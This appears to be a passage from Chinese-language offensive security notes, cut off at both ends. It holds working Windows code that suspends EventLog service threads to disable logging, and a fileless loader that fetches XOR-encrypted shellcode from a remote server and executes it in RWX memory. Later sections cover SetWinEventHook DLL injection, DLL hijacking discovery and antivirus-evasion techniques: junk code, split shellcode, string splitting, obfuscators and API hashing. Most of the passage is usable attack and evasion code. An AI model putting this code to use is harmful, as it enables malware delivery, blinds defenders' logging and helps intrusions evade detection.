OpenProcess(PROCESS_ALL_ACCESS, FALSE, servicePID); _Post_equals_last_error_ DWORD GetLastError(); snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); //# Get a list of modules loaded by svchost.exe EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded); _Post_equals_last_error_ DWORD GetLastError(); modulesCount = modulesSizeNeeded / sizeof(HMODULE); for (size_t i = 0; i < modulesCount; i++) { serviceModule = modules[i]; //# Get loaded module's name GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName)); if (wcscmp(remoteModuleName, L\"wevtsvc.dll\") == 0) { printf(\"Windows EventLog module %S at %p\\n\\n\", remoteModuleName, serviceModule); GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO)); } } //# Enumerate threads Thread32First(snapshotHandle, &threadEntry); while (Thread32Next(snapshotHandle, &threadEntry)) { if (threadEntry.th32OwnerProcessID == servicePID) { threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID); NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL); //# Check if thread's start address is inside wevtsvc.dll memory range if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage) { printf(\"Suspending EventLog thread %d with start address %p\\n\", threadEntry.th32ThreadID, threadStartAddress); //# Suspend EventLog service thread SuspendThread(threadHandle); Sleep(2000); } } } return 0; } \u65e0\u843d\u5730\u6587\u4ef6shellcode\uff08HTTP\u4e0b\u8f7d\uff09 \u4e00\u79cd\u65e0\u6587\u4ef6shellcode\u7684\u5b9e\u73b0\u65b9\u5f0f\u3002 \u4f7f\u7528winhttp\u5e93\u6765\u8fdc\u7a0b\u4e0b\u8f7dshellcode \u6539\u8fdb\u601d\u8def 1.\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u52a0\u5bc6\u7684\u6570\u636e\uff0c\u8981\u4f7f\u7528\u65f6\u518d\u89e3\u5bc6\u3002\uff08\u9700\u8981\u51c6\u5907\u4e00\u5957\u52a0\u5bc6\u7a0b\u5e8f\uff09 2.\u5b9e\u73b0\u8c03\u8bd5\u548c\u6c99\u7bb1\u5224\u65ad\uff0c\u662f\u771f\u5b9e\u73af\u5883\u65f6\u518d\u4e0b\u8f7dshellcode 3.\u654f\u611f\u51fd\u6570\u7ed5\u6740\u8f6fhook #include <windows.h> #include <winhttp.h> #include <stdio.h> #include <Windows.h> #include <iostream> #include <vector> #pragma comment(lib,\"winhttp.lib\") #pragma warning(disable:4996) typedef struct Params { LPVOID pBaseAddress; } PARAMS; typedef VOID(*fprun)(PARAMS pParams); //XOR\u89e3\u5bc6\u7a0b\u5e8f void XOR(char* data, int len, unsigned char key) { int i; for (i = 0; i < len; i++) data[i] ^= key; } // Encryption Key const char key[2] = \"A\"; size_t keySize = sizeof(key); //\u52a0/\u89e3\u5bc6 void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) { for (size_t i = 0; i < length; ++i) { buffer[i] ^= key[i % keyLength]; } } //\u679a\u4e3e\u5806\u5e76XOR\u52a0\u5bc6 PROCESS_HEAP_ENTRY entry; void HeapEncryptDecrypt() { SecureZeroMemory(&entry, sizeof(entry)); while (HeapWalk(GetProcessHeap(), &entry)) { if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) { //\u5982\u679c\u5185\u5b58\u6570\u636e\u5b58\u5728 xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData); // } } } //https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect int main() { //--------- CONFIGURE ----------- LPCWSTR remotehost = L\"192.168.14.1\"; //change to your IP int remoteport = 8000; //change to your port LPCWSTR remotedir = L\"/TEST1\"; //change to your directory of the hosted bin file unsigned char key = 0x7e; //change to your key //------------------------------- // Initialize variables HINTERNET hInternet; HINTERNET hHttpSession; HINTERNET hHttpConnection; HINTERNET hHttpRequest; DWORD dwSize; BOOL bResults; DWORD dwStatus; DWORD dwStatusSize; DWORD dwDownloaded = 0; LPSTR pszOutBuffer; std::vector<unsigned char> PEbuffer; // Initialize WinHTTP (change the first argument to a valid User-Agent instead) hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); printf(\"[+] WinHTTP initialized\\n\"); // Connect to the HTTP server hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0); printf(\"[+] Connected to HTTP Server\\n\"); // Open an HTTP request hHttpRequest = WinHttpOpenRequest(hHttpSession, L\"GET\", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); printf(\"[+] Sending HTTP GET Request\\n\"); // Send a request bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); printf(\"[+] WinHTTP request sent\\n\"); // Wait for the response bResults = WinHttpReceiveResponse(hHttpRequest, NULL); printf(\"[+] Response retrieved\\n\"); do { dwSize = 0; if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize)) { printf(\"Error %u in WinHttpQueryDataAvailable.\\n\", GetLastError()); } // Allocate space for the buffer. pszOutBuffer = new char[dwSize + 1]; // No more available data if (!pszOutBuffer) { printf(\"[-] No more available data\"); dwSize = 0; } // Read the Data. ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) printf(\"Error %u in WinHttpReadData.\\n\", GetLastError()); else PEbuffer.insert(PEbuffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded); } while (dwSize > 0); char* PE = (char*)malloc(PEbuffer.size()); for (int i = 0; i < PEbuffer.size(); i++) { PE[i] = PEbuffer[i] ^ key; //XOR encrypted printf(\"%x\",PE[i]); } //\u5230\u8fd9\u91cc\u5b8c\u6210\u4e0b\u8f7d\u653e\u5165\u5806\u5e76\u4ea6\u6216\u52a0\u5bc6 printf(\"[+] Encrypted shellcode allocated in heap\\n\"); // Set the base address of the current image. PARAMS pParams; pParams.pBaseAddress = (LPVOID)GetModuleHandleA(NULL); ////printf(\"[+] Current image base address = 0x%p\\n\", pParams.pBaseAddress); LPVOID pBuffer = VirtualAlloc(NULL, PEbuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //\u5206\u914dRWX\u5185\u5b58\u5757 if (NULL == pBuffer) { printf(\"[!] VirtualAlloc failed\\n\"); exit(1); } //printf(\"[+] Allocated space for the buffer %p\\n\", pBuffer); XOR(PE, PEbuffer.size(), key); //decrypt the PE shellcode before writing to memory // Copy the shellcode into it. memcpy(pBuffer, PE, PEbuffer.size()); //printf(\"[+] Shellcode decrypted and written\\n\"); //((void(*)())pBuffer)(); //\u5230\u8fd9\u91cc\u5206\u914d\u5185\u5b58\uff0c\u628a\u89e3\u5bc6\u540e\u7684shellcode\u590d\u5236\u5230pBuffer //time for your creativity //printf(\"[+] Encrypting the heap for 10 seconds\\n\"); HeapEncryptDecrypt(); //////Sleep(10); //create your own sleep patch instead ////printf(\"[+] Decrypting the heap\\n\"); HeapEncryptDecrypt(); fprun Run = (fprun)pBuffer; Run(pParams); //\u8fd0\u884cHeapEncryptDecrypt\u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u5bf9\u5f53\u524d\u5806\u52a0\u5bc6\u518d\u89e3\u5bc6\uff1f\u6709\u4ec0\u4e48\u7528 // Make a function pointer to the run function shellcode. //\u8fd9\u91cc\u662f\u6267\u884cshellcode // Close the HTTP request WinHttpCloseHandle(hHttpRequest); // Close the session WinHttpCloseHandle(hHttpSession); // Cleanup WinHttpCloseHandle(hInternet); free(PE); return 0; } PEB\u5b66\u4e60 PEB\u662fwindows\u4e2d\u7684\u8fdb\u7a0b\u73af\u5883\u5757\uff0c\u5b58\u50a8\u4e86\u8fdb\u7a0b\u76f8\u5173\u7684\u4fe1\u606f\u3002 \u5728windbg\u4e2d\u4f7f\u7528 dt _peb \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u8fdb\u7a0b\u7684peb\u7ed3\u6784\u4f53\uff0c\u5173\u952e\u7684\u4e09\u4e2a\u53c2\u6570 +0x010 ImageBaseAddress : Ptr64 Void +0x018 Ldr : Ptr64 _PEB_LDR_DATA +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS \u627e\u5230peb\u5730\u5740 0:024> r $peb $peb=00000098d212b000 \u5c06\u5730\u5740\u5e94\u7528\u5230\u7ed3\u6784\u4f53\u4e2d\uff0c\u89c2\u5bdf ImageBaseAddress 0:024> dt _peb @$peb ntdll!_PEB +0x000 InheritedAddressSpace : 0 '' +0x001 ReadImageFileExecOptions : 0 '' +0x002 BeingDebugged : 0x1 '' +0x003 BitField : 0x34 '4' +0x003 ImageUsesLargePages : 0y0 +0x003 IsProtectedProcess : 0y0 +0x003 IsImageDynamicallyRelocated : 0y1 +0x003 SkipPatchingUser32Forwarders : 0y0 +0x003 IsPackagedProcess : 0y1 +0x003 IsAppContainer : 0y1 +0x003 IsProtectedProcessLight : 0y0 +0x003 IsLongPathAwareProcess : 0y0 +0x004 Padding0 : [4] \"\" +0x008 Mutant : 0xffffffff`ffffffff Void +0x010 ImageBaseAddress : 0x00007ff7`f8c90000 Void +0x018 Ldr : 0x00007ffb`bb5343c0 _PEB_LDR_DATA +0x020 ProcessParameters : 0x0000019a`f7605040 _RTL_USER_PROCESS_PARAMETERS \u67e5\u770b ImageBaseAddress \u7684\u5185\u5bb9 0:024> db 0x00007ff7f8c90000 00007ff7`f8c90000 4d 5a 00 00 00 00 00 00-00 00 00 00 00 00 00 00 MZ.............. 00007ff7`f8c90010 00 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00 ........@....... 00007ff7`f8c90020 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00007ff7`f8c90030 00 00 00 00 00 00 00 00-00 00 00 00 40 00 00 00 ............@... 00007ff7`f8c90040 50 45 00 00 64 86 04 00-66 42 69 63 00 00 00 00 PE..d...fBic.... 00007ff7`f8c90050 00 00 00 00 f0 00 22 00-0b 02 0b 00 00 02 00 00 ......\"......... 00007ff7`f8c90060 3e 3f 00 00 00 00 00 00-00 70 00 00 00 70 00 00 >?.......p...p.. 00007ff7`f8c90070 00 00 c9 f8 f7 7f 00 00-00 10 00 00 00 02 00 00 ................ \u548c\u6587\u4ef6\u539f\u59cb\u5185\u5bb9\u662f\u76f8\u540c\u7684 \u76f4\u63a5\u67e5\u8be2 ImageBaseAddress 0:001> dt _peb ntdll!_PEB +0x010 ImageBaseAddress : Ptr64 Void 0:001> dd @$peb+0x010 L2 000007ff`fffd5010 49d40000 00000000 // 49d40000 00000000 is little-endian byte format - need to invert 0:001> db 0000000049d40000 L100 !peb \u4f7f\u7528SetWinEventHook\u6765\u6267\u884c\u56de\u8c03\u4ee3\u7801 SetWinEventHook\u662f\u4e00\u4e2a\u76d1\u63a7UI\u76f8\u5173\u64cd\u4f5c\u4e8b\u4ef6\u7684\u94a9\u5b50\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u4f7f\u7528callback\u6267\u884c\u60f3\u8981\u7684\u4ee3\u7801 https://scorpiosoftware.net/2023/09/24/windows-hook-events/ \u5355exe // SimpleWinEventHook.cpp : This file contains the 'main' function. Program execution begins and ends there. // #include \"pch.h\" #pragma comment(lib, \"oleacc\") const char* EventNameToString(DWORD event) { switch (event) { case EVENT_SYSTEM_SOUND: return \"Sound\"; case EVENT_SYSTEM_ALERT: return \"Alert\"; case EVENT_SYSTEM_FOREGROUND: return \"Foreground\"; case EVENT_SYSTEM_MENUSTART: return \"Menu Start\"; case EVENT_SYSTEM_MENUEND: return \"Menu End\"; case EVENT_SYSTEM_CAPTURESTART: return \"Capture Start\"; case EVENT_SYSTEM_CAPTUREEND: return \"Capture End\"; case EVENT_SYSTEM_MOVESIZESTART: return \"Move/Size Start\"; case EVENT_SYSTEM_MOVESIZEEND: return \"Move/Size End\"; case EVENT_SYSTEM_DIALOGSTART: return \"Dialog Start\"; case EVENT_SYSTEM_DIALOGEND: return \"Dialog End\"; case EVENT_SYSTEM_SWITCHSTART: return \"Switch Start\"; case EVENT_SYSTEM_SWITCHEND: return \"Switch End\"; case EVENT_SYSTEM_MINIMIZESTART: return \"Minimize Start\"; case EVENT_SYSTEM_MINIMIZEEND: return \"Minimize End\"; case EVENT_OBJECT_CREATE: return \"Object Create\"; case EVENT_OBJECT_DESTROY: return \"Object Destroy\"; case EVENT_OBJECT_SHOW: return \"Object Show\"; case EVENT_OBJECT_HIDE: return \"Object Hide\"; case EVENT_OBJECT_STATECHANGE: return \"State Changed\"; case EVENT_OBJECT_LOCATIONCHANGE: return \"Location Changed\"; case EVENT_OBJECT_NAMECHANGE: return \"Name Change\"; case EVENT_OBJECT_DESCRIPTIONCHANGE: return \"Desc Changed\"; case EVENT_OBJECT_VALUECHANGE: return \"Value Changed\"; case EVENT_OBJECT_PARENTCHANGE: return \"Parent Changed\"; } return \"\"; } void CALLBACK OnEvent(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD time) { CComPtr<IAccessible> spAcc; CComVariant child; ::AccessibleObjectFromEvent(hwnd, idObject, idChild, &spAcc, &child); CComBSTR name; if (spAcc) spAcc->get_accName(CComVariant(idChild), &name); DWORD pid = 16536; WCHAR exeName[MAX_PATH]; PCWSTR pExeName = L\"\"; if (hwnd && ::GetWindowThreadProcessId(hwnd, &pid)) { auto hProcess = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (hProcess) { DWORD size = _countof(exeName); if (::QueryFullProcessImageName(hProcess, 0, exeName, &size)) pExeName = wcsrchr(exeName, L'\\\\') + 1; ::CloseHandle(hProcess); } } printf(\"Event: 0x%X (%s) HWND: 0x%p, ID: 0x%X Child: 0x%X TID: %u PID: %u (%ws) Time: %u Name: %ws\\n\", event, EventNameToString(event), hwnd, idObject, idChild, idEventThread, pid, pExeName, time, name.m_str); } int main() { auto hHook = ::SetWinEventHook(EVENT_MIN, EVENT_MAX, nullptr, OnEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS | WINEVENT_SKIPOWNTHREAD); ::GetMessage(nullptr, nullptr, 0, 0); } dll // WinHookInject.cpp : This file contains the 'main' function. Program execution begins and ends there. // #include \"pch.h\" int main(int argc, const char* argv[]) { DWORD pid = argc < 2 ? 0 : atoi(argv[1]); if (pid == 0) { printf(\"Warning: injecting to potentially processes with threads connected to the current desktop.\\n\"); printf(\"Continue? (y/n) \"); char ans[3]; gets_s(ans); if (tolower(ans[0]) != 'y') return 0; } auto hLib = ::LoadLibrary(L\"Injected.Dll\"); if (!hLib) { printf(\"DLL not found!\\n\"); return 1; } auto OnEvent = (WINEVENTPROC)::GetProcAddress(hLib, \"OnEvent\"); if (!OnEvent) { printf(\"Event handler not found!\\n\"); return 1; } auto hHook = ::SetWinEventHook(0x0016, 0x0017, hLib, OnEvent, pid, 0, WINEVENT_INCONTEXT); if (!hHook) { printf(\"Failed!\\n\"); return 1; } // // keep process alive // ::GetMessage(nullptr, nullptr, 0, 0); return 0; } #include \"pch.h\" #pragma comment(lib, \"oleacc\") const char* EventNameToString(DWORD event) { switch (event) { case EVENT_SYSTEM_SOUND: return \"Sound\"; case EVENT_SYSTEM_ALERT: return \"Alert\"; case EVENT_SYSTEM_FOREGROUND: return \"Foreground\"; case EVENT_SYSTEM_MENUSTART: return \"Menu Start\"; case EVENT_SYSTEM_MENUEND: return \"Menu End\"; case EVENT_SYSTEM_CAPTURESTART: return \"Capture Start\"; case EVENT_SYSTEM_CAPTUREEND: return \"Capture End\"; case EVENT_SYSTEM_MOVESIZESTART: return \"Move/Size Start\"; case EVENT_SYSTEM_MOVESIZEEND: return \"Move/Size End\"; case EVENT_SYSTEM_DIALOGSTART: return \"Dialog Start\"; case EVENT_SYSTEM_DIALOGEND: return \"Dialog End\"; case EVENT_SYSTEM_SWITCHSTART: return \"Switch Start\"; case EVENT_SYSTEM_SWITCHEND: return \"Switch End\"; case EVENT_SYSTEM_MINIMIZESTART: return \"Minimize Start\"; case EVENT_SYSTEM_MINIMIZEEND: return \"Minimize End\"; case EVENT_OBJECT_CREATE: return \"Object Create\"; case EVENT_OBJECT_DESTROY: return \"Object Destroy\"; case EVENT_OBJECT_SHOW: return \"Object Show\"; case EVENT_OBJECT_HIDE: return \"Object Hide\"; case EVENT_OBJECT_STATECHANGE: return \"State Changed\"; case EVENT_OBJECT_LOCATIONCHANGE: return \"Location Changed\"; case EVENT_OBJECT_NAMECHANGE: return \"Name Change\"; case EVENT_OBJECT_DESCRIPTIONCHANGE: return \"Desc Changed\"; case EVENT_OBJECT_VALUECHANGE: return \"Value Changed\"; case EVENT_OBJECT_PARENTCHANGE: return \"Parent Changed\"; } return \"\"; } HANDLE hConsole; BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, PVOID lpReserved) { switch (reason) { case DLL_PROCESS_DETACH: if (hConsole) // be nice ::CloseHandle(hConsole); break; case DLL_PROCESS_ATTACH: if (::AllocConsole()) { auto hConsole = ::CreateFile(L\"CONOUT$\", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr); if (hConsole == INVALID_HANDLE_VALUE) return FALSE; ::SetStdHandle(STD_OUTPUT_HANDLE, hConsole); } break; } return TRUE; } extern \"C\" __declspec(dllexport) void CALLBACK OnEvent(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD time) { CComPtr<IAccessible> spAcc; CComVariant child; ::AccessibleObjectFromEvent(hwnd, idObject, idChild, &spAcc, &child); CComBSTR name; if (spAcc) spAcc->get_accName(CComVariant(idChild), &name); printf(\"Event: 0x%X (%s) HWND: 0x%p, ID: 0x%X Child: 0x%X TID: %u Time: %u Name: %ws\\n\", event, EventNameToString(event), hwnd, idObject, idChild, idEventThread, time, name.m_str); system(\"calc.exe\"); } \u5404\u79cdshellcode https://osandamalith.com/shellcodes/ \u9632\u5fa1\u89c4\u907f \u8fc7\u52a8\u6001\u7684\u65b9\u5f0f \u767d\u5229\u7528 \u4f7f\u7528Spartacus\u6765\u68c0\u67e5exe\u53ef\u52ab\u6301\u7684dll\u5e76\u81ea\u52a8\u751f\u6210\u8f6c\u53d1\u6a21\u677f `.\\Spartacus-v1.2.0-x64.exe --procmon C:\\Users\\user\\Desktop\\Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose` \u65b0\u6ce8\u5165\u6280\u672f \u67e5\u770b\u4ee3\u7801\u6ce8\u5165 \u8282 \u76f4\u63a5/\u95f4\u63a5syscall API HASH \u4f7f\u7528\u539f\u751fAPI \u8fc7\u9759\u6001\u7684\u65b9\u5f0f \u7a7a\u51fd\u6570 \u75af\u72c2\u6dfb\u52a0\u7a7a\u51fd\u6570 void dummyFunction() { } dummyFunction(); \u65e0\u610f\u4e49\u8bed\u53e5 \u50cf\u4ec0\u4e48\u6570\u503c\u8fd0\u7b97\u4e4b\u7c7b\u7684 int a = 0; a = a + 1; Sleep\u5ef6\u65f6 Sleep\u51fd\u6570\u4f1a\u51fa\u73b0\u5728\u5bfc\u5165\u8868\u4e2d Sleep(1); //\u5ef6\u65f61\u6beb\u79d2 \u7a7a\u5faa\u73af\uff0c\u4e5f\u662f\u5ef6\u65f6 int a = 0; void delay() { for (volatile int i = 0; i < 1000000; i++) { a = a + 2; } delay() \u65b0\u5efa\u51fd\u6570\u6307\u9488\u95f4\u63a5\u8c03\u7528 \u4ee3\u7801\u6f14\u793a\u521b\u5efa\u4e86\u4e00\u4e2a\u6307\u5411CreateEventW\u51fd\u6570\u7684\u51fd\u6570\u6307\u9488\u7c7b\u578bCreateEventWPtr\uff0c\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u65b0\u5efacreateEventW\u6765\u95f4\u63a5\u8c03\u7528CreateEventW #include <stdio.h> #include <windows.h> typedef HANDLE(WINAPI *CreateEventWPtr)( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName ); int main() { HMODULE hKernel32 = GetModuleHandle(\"kernel32.dll\"); if (hKernel32 == NULL) { printf(\"Failed to load kernel32.dll\\n\"); return 1; } CreateEventWPtr createEventW = (CreateEventWPtr)GetProcAddress(hKernel32, \"CreateEventW\"); if (createEventW == NULL) { printf(\"Failed to get address of CreateEventW\\n\"); return 1; } HANDLE hEvent = createEventW(NULL, TRUE, FALSE, L\"MyEvent\"); if (hEvent == NULL) { printf(\"Failed to create event\\n\"); return 1; } printf(\"Event created successfully\\n\"); return 0; } \u591a\u6dfb\u52a0\u51fd\u6570\u8c03\u7528,\u4ea7\u751f\u65e0\u610f\u4e49\u7ed3\u679c \u591a\u6dfb\u52a0\u70b9\u51fd\u6570\uff0c\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u4ea7\u751f\u65e0\u610f\u4e49\u7684\u7ed3\u679c\uff0c\u8ba9\u66f4\u591a\u6b63\u5e38\u51fd\u6570\u51fa\u73b0\u5728\u5bfc\u5165\u8868\u4e2d\u3002 \u4f7f\u7528\u54ea\u4e9b\u6b63\u5e38\u51fd\u6570\u53ef\u53c2\u7167\u6b63\u5e38\u7a0b\u5e8f\u3002 \u4e0d\u7136\u76f4\u63a5\u770b\u5230\u9664\u4e86OpenProcess\u3001VirtualAlloc\u3001memcpy\u3001processHandle\u8fd9\u79cd\u5c31\u6ca1\u6709\u5176\u4ed6\u7684\u51fd\u6570\u4e86\uff0c\u4e00\u773c\u5c31\u77e5\u9053\u662f\u9a6c lstrlenW\u51fd\u6570 LPCWSTR str = L\"Hello, World!\"; lstrlenW(str); \u5176\u4ed6.... shellcode\u5206\u79bb\u518d\u7ec4\u5408 \u628ashellcode\u5206\u6210\u4e24\u6bb5\uff0c\u518d\u7ec4\u5408 unsigned char shellcode[] = \"\\xfd\\x48\\x83\\xe4\\xf0\"; char first[] = \"\\xfc\"; memcpy(shellcode, first, 1); //\u628afirst\u76841\u4e2a\u5b57\u8282\u590d\u5236\u5230shellcdoe\u91cc\uff0c\u590d\u5236\u662f\u7531\u524d\u5f80\u540e\u590d\u5236\u7684\uff0c\u8fd9\u91cc\u7684\u590d\u5236\u662f\u8986\u76d6\uff0c\u8981\u590d\u5236\u591a\u5c11\u8fc7\u53bb\uff0c\u5c31\u8981\u5728\u539fshellcode\u9700\u8981\u586b\u5145\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e \u5173\u952e\u5b57\u6570\u7ec4\u5316\u5904\u7406 \u52a0\u8f7ddll\u65f6\u4f7f\u7528\u6570\u7ec4\u53ef\u6253\u4e71\u9488\u5bf9dll\u540d\u79f0\u5173\u952e\u5b57\u7684\u9759\u6001\u67e5\u6740 \u5047\u5982 LoadLibraryA(\"NTDLL.DLL\") \u88ab\u6740\uff0c\u53ef\u4ee5\u91c7\u7528\u4ee5\u4e0b\u65b9\u5f0f\u89e3\u51b3 CHAR NameStr[] = {'A','D','V','A','P','I','3','2','.','D','L','L','\\0'}; LoadLibraryA(NameStr); \u8fd8\u53ef\u4ee5\u7528\u6570\u7ec4\u62c6\u5206\u65b9\u5f0f\u8fdb\u4e00\u6b65\u6253\u4e71\u5173\u952e\u5b57 CHAR NameStr[] = {'A','D','V','A','P','I','3','2','\\0'}; CHAR OtherStr[] = {'.','D','L','L','\\0'}; CHAR CombinedStr[sizeof(NameStr) + sizeof(OtherStr)]; strcpy(CombinedStr, NameStr); strcat(CombinedStr, OtherStr); LoadLibraryA(CombinedStr); \u5185\u8054\u6c47\u7f16 \u4f7f\u7528\u6c47\u7f16\u4ee3\u7801\u5f3a\u5236\u66f4\u6539\u7a0b\u5e8f\u8fd0\u884c\u903b\u8f91 https://blog.malicious.group/inline-assembly/ \u4ee3\u7801\u6df7\u6dc6 Alcatraz \u4e8c\u8fdb\u5236\u6df7\u6dc6 https://github.com/weak1337/Alcatraz \u7ed5\u6740\u8f6fhook \u8fd9\u91cc\u9700\u8981\u660e\u767d\u4e00\u4e2a\u57fa\u672c\u9053\u7406\uff0c\u7cfb\u7edf\u7ea7\u522b\u7684\u51fd\u6570\u90fd\u662f\u5728 ntdll.dll \u4e2d\uff0c\u51fd\u6570\u8c03\u7528\u9700\u8981\u5728\u5185\u5b58\u4e2d\u627e\u5230\u51fd\u6570\u7684\u5730\u5740\uff0c\u7136\u540e\u624d\u53ef\u4ee5\u8c03\u7528\u3002 \u4f7f\u7528API-HASH \u901a\u8fc7\u51fd\u6570\u540d\u79f0\u8ba1\u7b97\u4e00\u4e2ahash\u503c\uff0c\u8c03\u7528\u65f6\u53cd\u8ba1\u7b97hash\u503c\u5f97\u5230\u51fd\u6570\u540d\uff0c\u518d\u6839\u636e\u51fd\u6570\u540d\u5728\u5185\u5b58\u4e2d\u67e5\u627e\u51fd\u6570\u5730\u5740\uff0c\u65b0\u5efa\u4e00\u4e2a\u76f8\u540c\u7684\u51fd\u6570\u6307\u9488\u6765\u8c03\u7528\u539f\u51fd\u6570\u5730\u5740 ##\u7b2c\u4e00\u6b65\uff0c\u8ba1\u7b97\u8981\u9690\u85cf\u7684\u51fd\u6570hash,\u5176\u4e2d$hash\u548c0xab10f2ff\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff0c\u4ee5CreateProcessA\u4e3a\u4f8b\uff0c\u8ba1\u7b97\u7684hash\u662f0x005882941 $APIsToHash = @(\"CreateProcessA\") $APIsToHash | % { $api = $_ $hash = 0x44 [int]$i = 0 $api.ToCharArray() | % { $l = $_ $c = [int64]$l $c = '0x{0:x}' -f $c $hash += $hash * 0xab10f2ff + $c -band 0xffffff $hashHex = '0x{0:x}' -f $hash $i++ write-host \"Iteration $i : $l : $c : $hashHex\" } write-host \"$api`t $('0x00{0:x}' -f $hash)\" } //\u7b2c\u4e8c\u6b65\uff0c\u7f16\u5199\u76f8\u5e94hash\u89e3\u5bc6\u51fd\u6570\u4e0e\u51fd\u6570\u5730\u5740\u67e5\u627e\u51fd\u6570 DWORD getHashFromString(char* string) { size_t stringLength = strnlen_s(string, 50); DWORD hash = 0x44; for (size_t i = 0; i < stringLength; i++) { hash += (hash * 0xab10f2ff + string[i]) & 0xffffff; } // printf(\"%s: 0x00%x\\n\", string, hash); return hash; } PDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; // Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread) HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Get RVAs to exported function related information PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals); // Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread) // If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process) for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Calculate hash for this exported function DWORD functionNameHash = getHashFromString(functionName); // If hash for CreateThread is found, resolve the function address if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } //\u7b2c\u4e09\u6b65\uff0c\u65b0\u5efa\u4e00\u4e2a\u76f8\u5bf9\u5e94\u7684\u51fd\u6570\u6307\u9488 using NewCreateProcessA = BOOL(WINAPI*)( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); //\u7b2c\u56db\u6b65\uff0c\u5728main\u51fd\u6570\u5f15\u7528\u8fd9\u4e2a\u65b0\u51fd\u6570 int main(){ PDWORD functionAddress = nullptr; //\u6307\u9488\u521d\u59cb\u5316 functionAddress = getFunctionAddressByHash((char*)\"kernel32\", 0x005882941); //\u5f97\u5230\u51fd\u6570\u5730\u5740 NewCreateProcessA CreateProcessB = (NewCreateProcessA)functionAddress; 